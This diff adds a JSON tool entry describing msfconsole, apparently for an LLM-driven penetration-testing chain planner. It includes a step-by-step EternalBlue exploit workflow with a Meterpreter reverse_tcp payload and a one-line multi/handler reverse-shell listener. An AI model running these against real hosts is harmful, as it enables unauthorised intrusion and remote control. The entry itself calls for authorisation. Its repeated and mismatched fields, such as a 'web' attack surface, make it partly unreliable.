@@ -1,0 +1,209 @@
+{
+  "id": "kali:msfconsole",
+  "kind": "kali_command_detailed_usage",
+  "name": "msfconsole",
+  "title": "Metasploit Framework Console",
+  "description": "The primary interactive command-line interface for the Metasploit Framework. It provides a centralized console to manage database integrations, search for security vulnerabilities/exploits, configure payloads, launch auxiliary network scanners, and interact with active post-exploitation sessions (e.g. Meterpreter).",
+  "what_for": [
+    "Vulnerability scanning and network service enumeration using auxiliary modules.",
+    "Exploiting security vulnerabilities in remote hosts using exploit modules.",
+    "Setting up local listener interfaces (handlers) to catch incoming reverse connections.",
+    "Conducting post-exploitation tasks, running post-exploitation modules, and executing commands on compromised targets."
+  ],
+  "how_to_use_workflow": [
+    {
+      "step": 1,
+      "name": "Initialize the Database (Optional but Recommended)",
+      "command": "msfdb init",
+      "description": "Initializes and starts the local PostgreSQL database to speed up module searches and log host/service/vulnerability status."
+    },
+    {
+      "step": 2,
+      "name": "Launch the Console",
+      "command": "msfconsole -q",
+      "description": "Launches the Metasploit console. The '-q' flag is commonly used to suppress the startup banner and speed up loading."
+    },
+    {
+      "step": 3,
+      "name": "Search for Modules",
+      "command": "search smb",
+      "description": "Searches the framework for modules matching keywords, CVE IDs (e.g. 'cve:2017-0144'), platform, or type."
+    },
+    {
+      "step": 4,
+      "name": "Select and Activate a Module",
+      "command": "use exploit/windows/smb/ms17_010_eternalblue",
+      "description": "Loads the selected module into the active console context."
+    },
+    {
+      "step": 5,
+      "name": "Configure Module Parameters",
+      "command": "show options",
+      "description": "Displays required and optional settings. Use 'set RHOSTS <IP>' to define the target and 'set LHOST <IP>' to specify your local interface."
+    },
+    {
+      "step": 6,
+      "name": "Configure the Payload",
+      "command": "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+      "description": "Sets the payload that will execute on the target host once exploitation succeeds."
+    },
+    {
+      "step": 7,
+      "name": "Execute/Exploit",
+      "command": "exploit",
+      "description": "Launches the attack. Can be run with '-j' to execute as a background job."
+    },
+    {
+      "step": 8,
+      "name": "Manage Sessions",
+      "command": "sessions -i <ID>",
+      "description": "Lists active sessions ('sessions') and interacts with a specific active session."
+    }
+  ],
+  "cli_arguments": [
+    {
+      "flags": [
+        "-q",
+        "--quiet"
+      ],
+      "description": "Do not print the banner on startup."
+    },
+    {
+      "flags": [
+        "-x",
+        "--execute COMMAND"
+      ],
+      "description": "Execute specified console commands directly from the shell (multiple commands separated by semicolons)."
+    },
+    {
+      "flags": [
+        "-r",
+        "--resource FILE"
+      ],
+      "description": "Run the specified resource file containing a list of console commands (similar to a script)."
+    },
+    {
+      "flags": [
+        "-o",
+        "--output FILE"
+      ],
+      "description": "Output console logs and command outputs to the specified file."
+    },
+    {
+      "flags": [
+        "-v",
+        "--version"
+      ],
+      "description": "Show framework version."
+    }
+  ],
+  "interactive_commands": [
+    {
+      "command": "help",
+      "description": "Show the main help menu."
+    },
+    {
+      "command": "search <query>",
+      "description": "Search for exploits, auxiliary scanners, or post modules."
+    },
+    {
+      "command": "use <module_name>",
+      "description": "Load a module by path or index."
+    },
+    {
+      "command": "info",
+      "description": "Display detailed documentation, authors, CVE info, and settings for the active module."
+    },
+    {
+      "command": "show options / show payloads / show targets",
+      "description": "Display relevant module settings, compatible payloads, or target operating system types."
+    },
+    {
+      "command": "set <name> <value> / setg <name> <value>",
+      "description": "Set options locally for the active module or globally for all modules."
+    },
+    {
+      "command": "exploit / run",
+      "description": "Run the active exploit or auxiliary scanner."
+    },
+    {
+      "command": "back",
+      "description": "Move out of the active module context back to the general prompt."
+    },
+    {
+      "command": "sessions -l / sessions -i <id>",
+      "description": "List active connections, or interact with a compromised system session."
+    },
+    {
+      "command": "jobs -l / jobs -k <id>",
+      "description": "List background tasks (e.g. running listeners), or terminate a specific job."
+    }
+  ],
+  "examples": [
+    {
+      "description": "Setting up a multi/handler listener to receive an incoming reverse shell session",
+      "command": "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.56.101; set LPORT 4444; set ExitOnSession false; exploit -j\""
+    },
+    {
+      "description": "Scanning a network subnet for open SMB shares non-interactively using an auxiliary scanner",
+      "command": "msfconsole -q -x \"use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.56.0/24; set THREADS 16; run; exit\""
+    },
+    {
+      "description": "Executing an exploit using a local resource script to automate setup",
+      "command": "msfconsole -q -r autopilot_script.rc"
+    }
+  ],
+  "risk": {
+    "level": "critical",
+    "signals": [
+      "offensive_tool",
+      "intrinsic",
+      "remote_possible",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": true,
+    "allow_autonomous_execution": false,
+    "warning": "Executing exploit modules can cause service disruptions (DoS), crash operating systems, trigger firewalls/EDRs, and execute arbitrary code on targets. Autonomous execution is disallowed. Always obtain prior authorization and verify host ranges."
+  },
+  "tags": [
+    "offensive",
+    "msfconsole",
+    "web",
+    "kfiosa",
+    "indexed",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
+  ],
+  "command_examples": [
+    "cd toolboxes/msfconsole && python3 msfconsole.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/msfconsole && python3 msfconsole.py --help",
+    "cd toolboxes/msfconsole && python3 msfconsole.py --help",
+    "cd toolboxes/msfconsole && python3 msfconsole.py --help",
+    "cd toolboxes/msfconsole && python3 msfconsole.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST msfconsole --output $KFIOSA_OUTPUT_DIR/msfconsole.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST msfconsole --output $KFIOSA_OUTPUT_DIR/msfconsole.log"
+  ],
+  "attack_surface": [
+    "web"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar"
+  ],
+  "target_adaptive_targets": [
+    "target_class"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0"
+}
